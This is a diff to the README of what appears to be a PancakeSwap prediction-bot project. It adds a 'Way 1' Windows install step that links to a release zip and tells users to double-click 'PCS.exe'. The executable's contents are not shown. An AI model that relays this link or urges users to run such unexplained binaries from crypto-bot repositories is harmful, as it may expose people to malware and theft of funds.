@@ -50,7 +50,14 @@ With these updates, our goal is to provide a safer, more flexible, and user-cent
 - Double-click on the "ForceStart.exe" or "PCS.dmg" file to run it.
 - And follow the instructions in the application window.
 
-## 🐰⚡ Installation on CMD - Windows
+## 🐰⚡ Installation on Windows
+
+### Way 1
+
+- Download [WindowsApp](https://github.com/SilviaKadeh/pancake-predict-bot-UI-Supported/releases/download/v9.2/PCS_Windows.zip) the latest version.
+- Double-Click on the "PCS.exe" open to run it.
+
+### Way 2 - CMD
 
 Download and Install Git here:
 [Git](https://git-scm.com/download/win)
